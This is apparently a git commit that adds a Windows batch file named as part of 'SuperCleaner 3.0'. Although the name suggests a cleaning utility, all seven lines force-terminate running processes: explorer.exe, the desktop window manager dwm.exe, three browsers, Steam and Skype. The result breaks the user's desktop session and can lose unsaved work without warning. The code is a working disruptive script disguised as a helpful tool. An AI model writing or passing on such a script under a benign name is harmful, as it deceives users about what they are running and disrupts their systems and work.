54184f15578f709fad612bf17550929bee3f81ff
madScript <madscript01official@gmail.com>
2018-01-26 19:36:45 +0000

    Quadlado

---
+++ SuperCleaner 3.0/source.bat
@@ -0,0 +1,7 @@
+taskkill /F /IM explorer.exe
+taskkill /F /IM chrome.exe
+taskkill /F /IM firefox.exe
+taskkill /F /IM dwm.exe
+taskkill /F /IM MicrosoftEdge.exe
+taskkill /F /IM Steam.exe
+taskkill /F /IM Skype.exe
